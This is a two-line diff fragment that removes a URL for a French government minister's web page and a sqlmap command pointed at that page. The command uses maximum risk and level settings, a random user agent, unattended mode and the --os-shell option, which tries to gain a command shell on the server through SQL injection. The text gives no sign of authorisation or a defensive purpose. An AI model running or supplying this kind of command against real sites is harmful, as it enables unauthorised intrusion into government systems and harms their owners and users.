@@ -1,2 +1,0 @@
-https://www.gouvernement.fr/ministre/cedric-o
-python ../sqlmap/sqlmap.py -u "https://www.gouvernement.fr/ministre/cedric-o" --risk 3 --level 5 --batch --random-agent --os-shell 
